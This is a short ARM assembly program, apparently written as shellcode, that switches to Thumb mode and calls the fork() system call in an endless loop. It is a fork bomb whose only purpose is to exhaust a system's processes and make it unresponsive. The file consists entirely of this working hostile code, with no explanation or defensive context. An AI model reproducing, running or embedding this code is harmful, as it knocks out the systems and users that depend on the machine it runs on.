.section .text
.global _start

_start:
    .code 32
    ADD R3, PC, #1 @Switching to Thumb mode
    BX R3

    .code 16
    _loop:
    EOR R7, R7
    MOV R7, #2 @Syscall to fork()
    SVC #1
    MOV R8, R8 @NOP
    BL _loop
